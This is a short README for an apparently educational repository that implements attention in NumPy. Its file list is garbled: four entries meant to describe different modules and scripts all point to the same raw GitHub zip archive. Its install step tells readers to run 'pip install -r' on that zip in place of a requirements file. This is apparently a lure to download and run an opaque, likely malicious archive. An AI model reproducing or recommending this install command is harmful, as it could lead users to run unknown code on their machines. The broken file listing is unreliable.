# attention-from-scratch

A minimal, from-scratch exploration of the attention mechanism (scaled dot-product attention) using NumPy.

This repository is intentionally small and pedagogical. It aims to help you _see_ and _reason about_ attention without training loops, autograd, or deep-learning frameworks.

## What you'll find

- `notebooks/` — step-by-step notebook-style guides (in markdown) you can paste into Jupyter.
- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — clean NumPy implementation with helper utilities.
- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — numerically stable softmax.
- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — runnable script that walks through the core experiments and prints matrices.
- `https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip` — short, interview-ready takeaways.

## Requirements

- Python 3.8+
- NumPy
- Jupyter (optional, for notebooks)

Install:

```bash
python -m venv .venv
source .venv/bin/activate # or .venv\Scripts\activate on Windows
pip install -r https://github.com/Acinnamon9/attention-from-scratch/raw/refs/heads/main/notes/from_scratch_attention_1.3.zip
```
